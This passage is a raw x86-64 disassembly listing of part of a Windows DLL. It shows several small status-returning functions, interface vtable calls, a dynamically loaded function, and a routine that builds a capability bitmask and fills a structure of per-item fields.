   180002cd5:	8b c1                	mov    %ecx,%eax
   180002cd7:	48 83 c4 28          	add    $0x28,%rsp
   180002cdb:	c3                   	ret
   180002cdc:	cc                   	int3
   180002cdd:	cc                   	int3
   180002cde:	cc                   	int3
   180002cdf:	cc                   	int3
   180002ce0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ce4:	44 8b c2             	mov    %edx,%r8d
   180002ce7:	48 85 c9             	test   %rcx,%rcx
   180002cea:	75 08                	jne    0x180002cf4
   180002cec:	8d 41 02             	lea    0x2(%rcx),%eax
   180002cef:	48 83 c4 28          	add    $0x28,%rsp
   180002cf3:	c3                   	ret
   180002cf4:	f7 81 e0 00 00 00 00 	testl  $0x8000,0xe0(%rcx)
   180002cfb:	80 00 00 
   180002cfe:	75 0a                	jne    0x180002d0a
   180002d00:	b8 06 00 00 00       	mov    $0x6,%eax
   180002d05:	48 83 c4 28          	add    $0x28,%rsp
   180002d09:	c3                   	ret
   180002d0a:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   180002d11:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002d16:	33 db                	xor    %ebx,%ebx
   180002d18:	48 8b 01             	mov    (%rcx),%rax
   180002d1b:	41 83 f8 01          	cmp    $0x1,%r8d
   180002d1f:	8b d3                	mov    %ebx,%edx
   180002d21:	0f 94 c2             	sete   %dl
   180002d24:	ff 50 30             	call   *0x30(%rax)
   180002d27:	85 c0                	test   %eax,%eax
   180002d29:	0f 95 c3             	setne  %bl
   180002d2c:	8b c3                	mov    %ebx,%eax
   180002d2e:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180002d33:	48 83 c4 28          	add    $0x28,%rsp
   180002d37:	c3                   	ret
   180002d38:	cc                   	int3
   180002d39:	cc                   	int3
   180002d3a:	cc                   	int3
   180002d3b:	cc                   	int3
   180002d3c:	cc                   	int3
   180002d3d:	cc                   	int3
   180002d3e:	cc                   	int3
   180002d3f:	cc                   	int3
   180002d40:	48 83 ec 28          	sub    $0x28,%rsp
   180002d44:	48 85 c9             	test   %rcx,%rcx
   180002d47:	74 31                	je     0x180002d7a
   180002d49:	f7 81 e0 00 00 00 00 	testl  $0x8000,0xe0(%rcx)
   180002d50:	80 00 00 
   180002d53:	75 0a                	jne    0x180002d5f
   180002d55:	b8 06 00 00 00       	mov    $0x6,%eax
   180002d5a:	48 83 c4 28          	add    $0x28,%rsp
   180002d5e:	c3                   	ret
   180002d5f:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   180002d66:	48 8b 01             	mov    (%rcx),%rax
   180002d69:	ff 50 20             	call   *0x20(%rax)
   180002d6c:	33 c9                	xor    %ecx,%ecx
   180002d6e:	85 c0                	test   %eax,%eax
   180002d70:	0f 95 c1             	setne  %cl
   180002d73:	8b c1                	mov    %ecx,%eax
   180002d75:	48 83 c4 28          	add    $0x28,%rsp
   180002d79:	c3                   	ret
   180002d7a:	b8 02 00 00 00       	mov    $0x2,%eax
   180002d7f:	48 83 c4 28          	add    $0x28,%rsp
   180002d83:	c3                   	ret
   180002d84:	cc                   	int3
   180002d85:	cc                   	int3
   180002d86:	cc                   	int3
   180002d87:	cc                   	int3
   180002d88:	cc                   	int3
   180002d89:	cc                   	int3
   180002d8a:	cc                   	int3
   180002d8b:	cc                   	int3
   180002d8c:	cc                   	int3
   180002d8d:	cc                   	int3
   180002d8e:	cc                   	int3
   180002d8f:	cc                   	int3
   180002d90:	48 83 ec 28          	sub    $0x28,%rsp
   180002d94:	45 8b d1             	mov    %r9d,%r10d
   180002d97:	48 85 c9             	test   %rcx,%rcx
   180002d9a:	75 08                	jne    0x180002da4
   180002d9c:	8d 41 02             	lea    0x2(%rcx),%eax
   180002d9f:	48 83 c4 28          	add    $0x28,%rsp
   180002da3:	c3                   	ret
   180002da4:	f7 81 e0 00 00 00 00 	testl  $0x10000,0xe0(%rcx)
   180002dab:	00 01 00 
   180002dae:	75 0a                	jne    0x180002dba
   180002db0:	b8 06 00 00 00       	mov    $0x6,%eax
   180002db5:	48 83 c4 28          	add    $0x28,%rsp
   180002db9:	c3                   	ret
   180002dba:	48 8b 89 28 01 00 00 	mov    0x128(%rcx),%rcx
   180002dc1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002dc6:	33 db                	xor    %ebx,%ebx
   180002dc8:	48 8b 01             	mov    (%rcx),%rax
   180002dcb:	41 83 fa 01          	cmp    $0x1,%r10d
   180002dcf:	44 8b cb             	mov    %ebx,%r9d
   180002dd2:	41 0f 94 c1          	sete   %r9b
   180002dd6:	ff 50 20             	call   *0x20(%rax)
   180002dd9:	85 c0                	test   %eax,%eax
   180002ddb:	0f 95 c3             	setne  %bl
   180002dde:	8b c3                	mov    %ebx,%eax
   180002de0:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180002de5:	48 83 c4 28          	add    $0x28,%rsp
   180002de9:	c3                   	ret
   180002dea:	cc                   	int3
   180002deb:	cc                   	int3
   180002dec:	cc                   	int3
   180002ded:	cc                   	int3
   180002dee:	cc                   	int3
   180002def:	cc                   	int3
   180002df0:	40 53                	rex push %rbx
   180002df2:	48 83 ec 20          	sub    $0x20,%rsp
   180002df6:	48 8b d9             	mov    %rcx,%rbx
   180002df9:	48 85 c9             	test   %rcx,%rcx
   180002dfc:	75 09                	jne    0x180002e07
   180002dfe:	8d 41 02             	lea    0x2(%rcx),%eax
   180002e01:	48 83 c4 20          	add    $0x20,%rsp
   180002e05:	5b                   	pop    %rbx
   180002e06:	c3                   	ret
   180002e07:	48 8b 89 50 01 00 00 	mov    0x150(%rcx),%rcx
   180002e0e:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180002e13:	33 ff                	xor    %edi,%edi
   180002e15:	48 85 c9             	test   %rcx,%rcx
   180002e18:	74 0d                	je     0x180002e27
   180002e1a:	48 8b 01             	mov    (%rcx),%rax
   180002e1d:	ff 50 10             	call   *0x10(%rax)
   180002e20:	48 89 bb 50 01 00 00 	mov    %rdi,0x150(%rbx)
   180002e27:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   180002e2e:	48 85 c9             	test   %rcx,%rcx
   180002e31:	74 0d                	je     0x180002e40
   180002e33:	48 8b 01             	mov    (%rcx),%rax
   180002e36:	ff 50 10             	call   *0x10(%rax)
   180002e39:	48 89 bb 48 01 00 00 	mov    %rdi,0x148(%rbx)
   180002e40:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   180002e47:	48 85 c9             	test   %rcx,%rcx
   180002e4a:	74 0d                	je     0x180002e59
   180002e4c:	ff 15 0e e2 00 00    	call   *0xe20e(%rip)        # 0x180011060
   180002e52:	48 89 bb 30 01 00 00 	mov    %rdi,0x130(%rbx)
   180002e59:	48 89 bb 38 01 00 00 	mov    %rdi,0x138(%rbx)
   180002e60:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   180002e65:	33 c0                	xor    %eax,%eax
   180002e67:	48 83 c4 20          	add    $0x20,%rsp
   180002e6b:	5b                   	pop    %rbx
   180002e6c:	c3                   	ret
   180002e6d:	cc                   	int3
   180002e6e:	cc                   	int3
   180002e6f:	cc                   	int3
   180002e70:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002e75:	57                   	push   %rdi
   180002e76:	48 83 ec 20          	sub    $0x20,%rsp
   180002e7a:	49 8b d8             	mov    %r8,%rbx
   180002e7d:	48 8b f9             	mov    %rcx,%rdi
   180002e80:	48 85 c9             	test   %rcx,%rcx
   180002e83:	0f 84 c5 01 00 00    	je     0x18000304e
   180002e89:	48 85 d2             	test   %rdx,%rdx
   180002e8c:	0f 84 bc 01 00 00    	je     0x18000304e
   180002e92:	48 85 db             	test   %rbx,%rbx
   180002e95:	0f 84 b3 01 00 00    	je     0x18000304e
   180002e9b:	48 89 91 38 01 00 00 	mov    %rdx,0x138(%rcx)
   180002ea2:	48 8d 15 ff e4 00 00 	lea    0xe4ff(%rip),%rdx        # 0x1800113a8
   180002ea9:	48 8d 0d 08 e5 00 00 	lea    0xe508(%rip),%rcx        # 0x1800113b8
   180002eb0:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
   180002eb7:	e8 24 f2 ff ff       	call   0x1800020e0
   180002ebc:	48 89 87 30 01 00 00 	mov    %rax,0x130(%rdi)
   180002ec3:	48 85 c0             	test   %rax,%rax
   180002ec6:	75 10                	jne    0x180002ed8
   180002ec8:	b8 04 00 00 00       	mov    $0x4,%eax
   180002ecd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002ed2:	48 83 c4 20          	add    $0x20,%rsp
   180002ed6:	5f                   	pop    %rdi
   180002ed7:	c3                   	ret
   180002ed8:	48 8d 15 e9 e4 00 00 	lea    0xe4e9(%rip),%rdx        # 0x1800113c8
   180002edf:	48 8b c8             	mov    %rax,%rcx
   180002ee2:	ff 15 70 e1 00 00    	call   *0xe170(%rip)        # 0x180011058
   180002ee8:	48 85 c0             	test   %rax,%rax
   180002eeb:	0f 84 48 01 00 00    	je     0x180003039
   180002ef1:	48 8b 8f 38 01 00 00 	mov    0x138(%rdi),%rcx
   180002ef8:	4c 8d 87 48 01 00 00 	lea    0x148(%rdi),%r8
   180002eff:	48 8d 15 e2 e4 00 00 	lea    0xe4e2(%rip),%rdx        # 0x1800113e8
   180002f06:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180002f0b:	ff d0                	call   *%rax
   180002f0d:	85 c0                	test   %eax,%eax
   180002f0f:	0f 85 1f 01 00 00    	jne    0x180003034
   180002f15:	48 8b 8f 48 01 00 00 	mov    0x148(%rdi),%rcx
   180002f1c:	48 85 c9             	test   %rcx,%rcx
   180002f1f:	0f 84 0f 01 00 00    	je     0x180003034
   180002f25:	48 8b 01             	mov    (%rcx),%rax
   180002f28:	48 8b 97 38 01 00 00 	mov    0x138(%rdi),%rdx
   180002f2f:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180002f34:	48 8d b7 50 01 00 00 	lea    0x150(%rdi),%rsi
   180002f3b:	4c 8d 05 b6 e4 00 00 	lea    0xe4b6(%rip),%r8        # 0x1800113f8
   180002f42:	4c 8b ce             	mov    %rsi,%r9
   180002f45:	ff 50 18             	call   *0x18(%rax)
   180002f48:	85 c0                	test   %eax,%eax
   180002f4a:	0f 85 bd 00 00 00    	jne    0x18000300d
   180002f50:	48 8b 0e             	mov    (%rsi),%rcx
   180002f53:	48 85 c9             	test   %rcx,%rcx
   180002f56:	0f 84 b1 00 00 00    	je     0x18000300d
   180002f5c:	48 8b 01             	mov    (%rcx),%rax
   180002f5f:	ba 01 00 00 00       	mov    $0x1,%edx
   180002f64:	ff 50 20             	call   *0x20(%rax)
   180002f67:	85 c0                	test   %eax,%eax
   180002f69:	75 03                	jne    0x180002f6e
   180002f6b:	83 0b 01             	orl    $0x1,(%rbx)
   180002f6e:	48 8b 0e             	mov    (%rsi),%rcx
   180002f71:	ba 02 00 00 00       	mov    $0x2,%edx
   180002f76:	48 8b 01             	mov    (%rcx),%rax
   180002f79:	ff 50 20             	call   *0x20(%rax)
   180002f7c:	85 c0                	test   %eax,%eax
   180002f7e:	75 03                	jne    0x180002f83
   180002f80:	83 0b 02             	orl    $0x2,(%rbx)
   180002f83:	48 8b 0e             	mov    (%rsi),%rcx
   180002f86:	ba 03 00 00 00       	mov    $0x3,%edx
   180002f8b:	48 8b 01             	mov    (%rcx),%rax
   180002f8e:	ff 50 20             	call   *0x20(%rax)
   180002f91:	85 c0                	test   %eax,%eax
   180002f93:	75 03                	jne    0x180002f98
   180002f95:	83 0b 04             	orl    $0x4,(%rbx)
   180002f98:	48 8b 0e             	mov    (%rsi),%rcx
   180002f9b:	ba 04 00 00 00       	mov    $0x4,%edx
   180002fa0:	48 8b 01             	mov    (%rcx),%rax
   180002fa3:	ff 50 20             	call   *0x20(%rax)
   180002fa6:	85 c0                	test   %eax,%eax
   180002fa8:	75 03                	jne    0x180002fad
   180002faa:	83 0b 08             	orl    $0x8,(%rbx)
   180002fad:	48 8b 0e             	mov    (%rsi),%rcx
   180002fb0:	ba 05 00 00 00       	mov    $0x5,%edx
   180002fb5:	48 8b 01             	mov    (%rcx),%rax
   180002fb8:	ff 50 20             	call   *0x20(%rax)
   180002fbb:	85 c0                	test   %eax,%eax
   180002fbd:	75 03                	jne    0x180002fc2
   180002fbf:	83 0b 10             	orl    $0x10,(%rbx)
   180002fc2:	48 8b 0e             	mov    (%rsi),%rcx
   180002fc5:	ba 06 00 00 00       	mov    $0x6,%edx
   180002fca:	48 8b 01             	mov    (%rcx),%rax
   180002fcd:	ff 50 20             	call   *0x20(%rax)
   180002fd0:	85 c0                	test   %eax,%eax
   180002fd2:	75 03                	jne    0x180002fd7
   180002fd4:	83 0b 20             	orl    $0x20,(%rbx)
   180002fd7:	48 8b 0e             	mov    (%rsi),%rcx
   180002fda:	ba 07 00 00 00       	mov    $0x7,%edx
   180002fdf:	48 8b 01             	mov    (%rcx),%rax
   180002fe2:	ff 50 20             	call   *0x20(%rax)
   180002fe5:	85 c0                	test   %eax,%eax
   180002fe7:	75 03                	jne    0x180002fec
   180002fe9:	83 0b 40             	orl    $0x40,(%rbx)
   180002fec:	48 8b 0e             	mov    (%rsi),%rcx
   180002fef:	ba 08 00 00 00       	mov    $0x8,%edx
   180002ff4:	48 8b 01             	mov    (%rcx),%rax
   180002ff7:	ff 50 20             	call   *0x20(%rax)
   180002ffa:	85 c0                	test   %eax,%eax
   180002ffc:	75 06                	jne    0x180003004
   180002ffe:	81 0b 80 00 00 00    	orl    $0x80,(%rbx)
   180003004:	48 8b 0e             	mov    (%rsi),%rcx
   180003007:	48 8b 01             	mov    (%rcx),%rax
   18000300a:	ff 50 28             	call   *0x28(%rax)
   18000300d:	48 8b 8f 48 01 00 00 	mov    0x148(%rdi),%rcx
   180003014:	48 8b 97 38 01 00 00 	mov    0x138(%rdi),%rdx
   18000301b:	4c 8d 8f 58 01 00 00 	lea    0x158(%rdi),%r9
   180003022:	48 8b 01             	mov    (%rcx),%rax
   180003025:	4c 8d 05 dc e3 00 00 	lea    0xe3dc(%rip),%r8        # 0x180011408
   18000302c:	ff 50 18             	call   *0x18(%rax)
   18000302f:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180003034:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   180003039:	8b 03                	mov    (%rbx),%eax
   18000303b:	89 87 40 01 00 00    	mov    %eax,0x140(%rdi)
   180003041:	33 c0                	xor    %eax,%eax
   180003043:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003048:	48 83 c4 20          	add    $0x20,%rsp
   18000304c:	5f                   	pop    %rdi
   18000304d:	c3                   	ret
   18000304e:	b8 02 00 00 00       	mov    $0x2,%eax
   180003053:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003058:	48 83 c4 20          	add    $0x20,%rsp
   18000305c:	5f                   	pop    %rdi
   18000305d:	c3                   	ret
   18000305e:	cc                   	int3
   18000305f:	cc                   	int3
   180003060:	4c 8b dc             	mov    %rsp,%r11
   180003063:	55                   	push   %rbp
   180003064:	53                   	push   %rbx
   180003065:	57                   	push   %rdi
   180003066:	48 8d 6c 24 90       	lea    -0x70(%rsp),%rbp
   18000306b:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   180003072:	48 8b 05 87 5f 01 00 	mov    0x15f87(%rip),%rax        # 0x180019000
   180003079:	48 33 c4             	xor    %rsp,%rax
   18000307c:	48 89 45 40          	mov    %rax,0x40(%rbp)
   180003080:	48 63 42 60          	movslq 0x60(%rdx),%rax
   180003084:	49 89 73 18          	mov    %rsi,0x18(%r11)
   180003088:	33 ff                	xor    %edi,%edi
   18000308a:	4d 89 7b c8          	mov    %r15,-0x38(%r11)
   18000308e:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180003095:	00 
   180003096:	48 8b da             	mov    %rdx,%rbx
   180003099:	48 69 f0 24 06 00 00 	imul   $0x624,%rax,%rsi
   1800030a0:	48 03 b1 70 03 00 00 	add    0x370(%rcx),%rsi
   1800030a7:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
   1800030ab:	4c 8b f9             	mov    %rcx,%r15
   1800030ae:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800030b2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800030b7:	89 7d 84             	mov    %edi,-0x7c(%rbp)
   1800030ba:	89 7d 90             	mov    %edi,-0x70(%rbp)
   1800030bd:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   1800030c1:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   1800030c5:	8b 56 04             	mov    0x4(%rsi),%edx
   1800030c8:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   1800030cc:	4c 8d 4d a8          	lea    -0x58(%rbp),%r9
   1800030d0:	4c 8d 45 84          	lea    -0x7c(%rbp),%r8
   1800030d4:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
   1800030d8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800030dd:	41 ff 97 80 00 00 00 	call   *0x80(%r15)
   1800030e4:	85 c0                	test   %eax,%eax
   1800030e6:	0f 85 6b 03 00 00    	jne    0x180003457
   1800030ec:	44 8d 47 50          	lea    0x50(%rdi),%r8d
   1800030f0:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800030f4:	33 d2                	xor    %edx,%edx
   1800030f6:	e8 65 21 00 00       	call   0x180005260
   1800030fb:	44 8b 5d 90          	mov    -0x70(%rbp),%r11d
   1800030ff:	41 83 fb 01          	cmp    $0x1,%r11d
   180003103:	0f 8e 4e 03 00 00    	jle    0x180003457
   180003109:	44 8b 4d 84          	mov    -0x7c(%rbp),%r9d
   18000310d:	41 83 ca ff          	or     $0xffffffff,%r10d
   180003111:	44 8b c7             	mov    %edi,%r8d
   180003114:	8b cf                	mov    %edi,%ecx
   180003116:	45 85 c9             	test   %r9d,%r9d
   180003119:	0f 8e 38 03 00 00    	jle    0x180003457
   18000311f:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   180003123:	48 83 c0 40          	add    $0x40,%rax
   180003127:	8b 10                	mov    (%rax),%edx
   180003129:	41 3b d0             	cmp    %r8d,%edx
   18000312c:	7e 06                	jle    0x180003134
   18000312e:	44 8b d1             	mov    %ecx,%r10d
   180003131:	44 8b c2             	mov    %edx,%r8d
   180003134:	ff c1                	inc    %ecx
   180003136:	48 83 c0 50          	add    $0x50,%rax
   18000313a:	41 3b c9             	cmp    %r9d,%ecx
   18000313d:	7c e8                	jl     0x180003127
   18000313f:	41 83 f8 01          	cmp    $0x1,%r8d
   180003143:	0f 8e 0e 03 00 00    	jle    0x180003457
   180003149:	45 85 d2             	test   %r10d,%r10d
   18000314c:	0f 88 05 03 00 00    	js     0x180003457
   180003152:	45 3b d1             	cmp    %r9d,%r10d
   180003155:	0f 8d fc 02 00 00    	jge    0x180003457
   18000315b:	4c 8b 4d b8          	mov    -0x48(%rbp),%r9
   18000315f:	8b 56 04             	mov    0x4(%rsi),%edx
   180003162:	49 8b 4f 08          	mov    0x8(%r15),%rcx
   180003166:	48 8d 45 88          	lea    -0x78(%rbp),%rax
   18000316a:	45 8b c3             	mov    %r11d,%r8d
   18000316d:	89 7d 88             	mov    %edi,-0x78(%rbp)
   180003170:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003175:	41 ff 97 88 00 00 00 	call   *0x88(%r15)
   18000317c:	85 c0                	test   %eax,%eax
   18000317e:	0f 85 d3 02 00 00    	jne    0x180003457
   180003184:	44 8b 45 88          	mov    -0x78(%rbp),%r8d
   180003188:	45 85 c0             	test   %r8d,%r8d
   18000318b:	0f 88 c6 02 00 00    	js     0x180003457
   180003191:	8b 56 04             	mov    0x4(%rsi),%edx
   180003194:	49 8b 4f 08          	mov    0x8(%r15),%rcx
   180003198:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   18000319c:	4c 89 a4 24 68 01 00 	mov    %r12,0x168(%rsp)
   1800031a3:	00 
   1800031a4:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   1800031aa:	4c 8d 4d f0          	lea    -0x10(%rbp),%r9
   1800031ae:	44 89 64 24 70       	mov    %r12d,0x70(%rsp)
   1800031b3:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1800031b8:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   1800031bc:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800031c1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1800031c5:	89 7d 80             	mov    %edi,-0x80(%rbp)
   1800031c8:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1800031cd:	48 8d 45 cc          	lea    -0x34(%rbp),%rax
   1800031d1:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   1800031d5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800031da:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   1800031de:	89 7d 8c             	mov    %edi,-0x74(%rbp)
   1800031e1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800031e6:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
   1800031ea:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   1800031ee:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800031f3:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1800031f7:	89 7d 94             	mov    %edi,-0x6c(%rbp)
   1800031fa:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800031ff:	48 8d 45 8c          	lea    -0x74(%rbp),%rax
   180003203:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   180003207:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000320c:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   180003210:	89 7d cc             	mov    %edi,-0x34(%rbp)
   180003213:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180003218:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   18000321c:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
   180003220:	89 7d c8             	mov    %edi,-0x38(%rbp)
   180003223:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   180003227:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000322c:	41 ff 97 90 00 00 00 	call   *0x90(%r15)
   180003233:	85 c0                	test   %eax,%eax
   180003235:	0f 85 e7 01 00 00    	jne    0x180003422
   18000323b:	8b 45 00             	mov    0x0(%rbp),%eax
   18000323e:	8b 4d 04             	mov    0x4(%rbp),%ecx
   180003241:	4c 89 ac 24 60 01 00 	mov    %r13,0x160(%rsp)
   180003248:	00 
   180003249:	c7 43 48 01 00 00 00 	movl   $0x1,0x48(%rbx)
   180003250:	89 4b 4c             	mov    %ecx,0x4c(%rbx)
   180003253:	89 43 50             	mov    %eax,0x50(%rbx)
   180003256:	44 8d 68 ff          	lea    -0x1(%rax),%r13d
   18000325a:	83 f9 03             	cmp    $0x3,%ecx
   18000325d:	7c 0a                	jl     0x180003269
   18000325f:	83 f9 04             	cmp    $0x4,%ecx
   180003262:	7e 65                	jle    0x1800032c9
   180003264:	83 f9 06             	cmp    $0x6,%ecx
   180003267:	7e 03                	jle    0x18000326c
   180003269:	44 8b e7             	mov    %edi,%r12d
   18000326c:	44 8b 4d 80          	mov    -0x80(%rbp),%r9d
   180003270:	8b f7                	mov    %edi,%esi
   180003272:	45 85 c9             	test   %r9d,%r9d
   180003275:	0f 8e 9f 01 00 00    	jle    0x18000341a
   18000327b:	4c 89 b4 24 58 01 00 	mov    %r14,0x158(%rsp)
   180003282:	00 
   180003283:	4c 8b f7             	mov    %rdi,%r14
   180003286:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000328d:	00 00 00 
   180003290:	4c 8b 55 c0          	mov    -0x40(%rbp),%r10
   180003294:	8b 53 38             	mov    0x38(%rbx),%edx
   180003297:	8b cf                	mov    %edi,%ecx
   180003299:	4d 03 d6             	add    %r14,%r10
   18000329c:	85 d2                	test   %edx,%edx
   18000329e:	0f 8e 5f 01 00 00    	jle    0x180003403
   1800032a4:	4c 8b 5b 40          	mov    0x40(%rbx),%r11
   1800032a8:	45 8b 42 08          	mov    0x8(%r10),%r8d
   1800032ac:	49 8d 83 c8 01 00 00 	lea    0x1c8(%r11),%rax
   1800032b3:	44 39 00             	cmp    %r8d,(%rax)
   1800032b6:	74 19                	je     0x1800032d1
   1800032b8:	ff c1                	inc    %ecx
   1800032ba:	48 05 d0 01 00 00    	add    $0x1d0,%rax
   1800032c0:	3b ca                	cmp    %edx,%ecx
   1800032c2:	7c ef                	jl     0x1800032b3
   1800032c4:	e9 3a 01 00 00       	jmp    0x180003403
   1800032c9:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1800032cf:	eb 9b                	jmp    0x18000326c
   1800032d1:	48 63 c1             	movslq %ecx,%rax
   1800032d4:	48 69 c8 d0 01 00 00 	imul   $0x1d0,%rax,%rcx
   1800032db:	49 03 cb             	add    %r11,%rcx
   1800032de:	0f 84 1f 01 00 00    	je     0x180003403
   1800032e4:	83 89 20 01 00 00 10 	orl    $0x10,0x120(%rcx)
   1800032eb:	41 8b 42 24          	mov    0x24(%r10),%eax
   1800032ef:	89 81 54 01 00 00    	mov    %eax,0x154(%rcx)
   1800032f5:	41 8b 42 28          	mov    0x28(%r10),%eax
   1800032f9:	89 81 58 01 00 00    	mov    %eax,0x158(%rcx)
   1800032ff:	41 8b 42 40          	mov    0x40(%r10),%eax
   180003303:	89 81 40 01 00 00    	mov    %eax,0x140(%rcx)
   180003309:	41 8b 42 44          	mov    0x44(%r10),%eax
   18000330d:	89 81 44 01 00 00    	mov    %eax,0x144(%rcx)
   180003313:	41 8b 42 48          	mov    0x48(%r10),%eax
   180003317:	89 81 48 01 00 00    	mov    %eax,0x148(%rcx)
   18000331d:	41 8b 42 4c          	mov    0x4c(%r10),%eax
   180003321:	89 81 4c 01 00 00    	mov    %eax,0x14c(%rcx)
   180003327:	41 8b 42 58          	mov    0x58(%r10),%eax
   18000332b:	85 c0                	test   %eax,%eax
   18000332d:	74 0e                	je     0x18000333d
   18000332f:	3d b4 00 00 00       	cmp    $0xb4,%eax
   180003334:	74 07                	je     0x18000333d
   180003336:	83 89 20 01 00 00 40 	orl    $0x40,0x120(%rcx)
   18000333d:	44 3b a1 54 01 00 00 	cmp    0x154(%rcx),%r12d
   180003344:	75 10                	jne    0x180003356
   180003346:	44 3b a9 58 01 00 00 	cmp    0x158(%rcx),%r13d
   18000334d:	75 07                	jne    0x180003356
   18000334f:	83 89 20 01 00 00 20 	orl    $0x20,0x120(%rcx)
   180003356:	45 8b 42 08          	mov    0x8(%r10),%r8d
   18000335a:	49 8b 4f 08          	mov    0x8(%r15),%rcx
   18000335e:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   180003362:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003367:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   18000336b:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   18000336f:	8b 50 04             	mov    0x4(%rax),%edx
   180003372:	89 7d b0             	mov    %edi,-0x50(%rbp)
   180003375:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
   180003379:	41 ff 97 98 00 00 00 	call   *0x98(%r15)
   180003380:	85 c0                	test   %eax,%eax
   180003382:	75 72                	jne    0x1800033f6
   180003384:	44 8b 4d 8c          	mov    -0x74(%rbp),%r9d
   180003388:	4c 8b 45 98          	mov    -0x68(%rbp),%r8
   18000338c:	8b d7                	mov    %edi,%edx
   18000338e:	45 85 c9             	test   %r9d,%r9d
   180003391:	7e 26                	jle    0x1800033b9
   180003393:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   180003397:	45 8b 50 1c          	mov    0x1c(%r8),%r10d
   18000339b:	48 83 c1 2c          	add    $0x2c,%rcx
   18000339f:	90                   	nop
   1800033a0:	44 3b 51 fc          	cmp    -0x4(%rcx),%r10d
   1800033a4:	75 08                	jne    0x1800033ae
   1800033a6:	8b 01                	mov    (%rcx),%eax
   1800033a8:	41 39 40 20          	cmp    %eax,0x20(%r8)
   1800033ac:	74 3d                	je     0x1800033eb
   1800033ae:	ff c2                	inc    %edx
   1800033b0:	48 83 c1 50          	add    $0x50,%rcx
   1800033b4:	41 3b d1             	cmp    %r9d,%edx
   1800033b7:	7c e7                	jl     0x1800033a0
   1800033b9:	44 8b 4d 94          	mov    -0x6c(%rbp),%r9d
   1800033bd:	8b d7                	mov    %edi,%edx
   1800033bf:	45 85 c9             	test   %r9d,%r9d
   1800033c2:	7e 32                	jle    0x1800033f6
   1800033c4:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   1800033c8:	45 8b 50 1c          	mov    0x1c(%r8),%r10d
   1800033cc:	48 83 c1 2c          	add    $0x2c,%rcx
   1800033d0:	44 3b 51 fc          	cmp    -0x4(%rcx),%r10d
   1800033d4:	75 08                	jne    0x1800033de
   1800033d6:	8b 01                	mov    (%rcx),%eax
   1800033d8:	41 39 40 20          	cmp    %eax,0x20(%r8)
   1800033dc:	74 0d                	je     0x1800033eb
   1800033de:	ff c2                	inc    %edx
   1800033e0:	48 83 c1 58          	add    $0x58,%rcx
   1800033e4:	41 3b d1             	cmp    %r9d,%edx
   1800033e7:	7c e7                	jl     0x1800033d0
   1800033e9:	eb 0b                	jmp    0x1800033f6
   1800033eb:	44 89 53 54          	mov    %r10d,0x54(%rbx)
   1800033ef:	41 8b 40 20          	mov    0x20(%r8),%eax
   1800033f3:	89 43 58             	mov    %eax,0x58(%rbx)
   1800033f6:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
